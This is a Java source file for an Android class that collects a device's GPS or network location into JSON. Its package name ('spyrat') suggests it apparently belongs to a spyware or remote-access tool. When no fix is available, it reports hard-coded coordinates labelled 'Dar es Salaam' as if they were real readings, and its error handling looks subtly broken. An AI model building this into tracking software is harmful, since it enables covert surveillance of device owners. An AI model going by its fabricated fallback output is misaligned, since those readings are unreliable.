package com.spyrat.investigation;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;

public class RealLocationCollector {
    private static final String TAG = "RealLocationCollector";
    private Context context;
    
    public RealLocationCollector(Context context) {
        this.context = context;
    }
    
    public JSONObject getCurrentLocation() {
        JSONObject locationInfo = new JSONObject();
        
        try {
            Log.d(TAG, "📍 Collecting real location...");
            
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            // Try GPS first
            Location location = null;
            if (locationManager != null) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                }
                
                // If GPS not available, try network
                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
            }
            
            if (location != null) {
                locationInfo.put("latitude", location.getLatitude());
                locationInfo.put("longitude", location.getLongitude());
                locationInfo.put("accuracy", location.getAccuracy());
                locationInfo.put("provider", location.getProvider());
                locationInfo.put("timestamp", location.getTime());
                locationInfo.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
                locationInfo.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
                
                Log.d(TAG, "📍 Real Location: " + location.getLatitude() + ", " + location.getLongitude());
            } else {
                // Fallback to approximate location based on network
                locationInfo.put("latitude", -6.3690); // Default Dar es Salaam
                locationInfo.put("longitude", 34.8888);
                locationInfo.put("accuracy", 5000.0);
                locationInfo.put("provider", "network_approximate");
                locationInfo.put("timestamp", System.currentTimeMillis());
                locationInfo.put("note", "Approximate location - no GPS available");
                
                Log.d(TAG, "📍 Using approximate location");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Location permission denied: " + e.getMessage());
            locationInfo.put("error", "Location permission denied");
        } catch (Exception e) {
            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
            locationInfo.put("error", e.getMessage());
        }
        
        return locationInfo;
    }
}
